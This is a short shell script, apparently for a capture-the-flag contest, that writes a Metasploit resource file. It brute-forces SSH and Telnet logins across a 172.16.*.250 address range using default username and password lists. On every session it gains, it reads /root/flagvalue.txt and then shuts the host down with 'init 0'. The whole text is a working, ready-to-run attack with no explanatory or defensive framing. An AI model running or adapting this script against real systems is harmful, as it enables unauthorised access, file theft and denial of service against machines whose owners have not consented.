echo -e "root\nadmin\nguest" > user.txt
echo -e "123456\nroot" > pass.txt
s="auxiliary/scanner/ssh/ssh_login auxiliary/scanner/telnet/telnet_login"
for i in $s
do
echo "
use $i
set rhosts 172.16.*.250
set pass_file pass.txt
set user_file user.txt
set threads 1000000000000000000000000000000000000000
run ">> msf.rc
done
echo "sessions -c/-C 'cat /root/flagvalue.txt&&init 0'" >> msf.rc
msfconsole -r msf.rc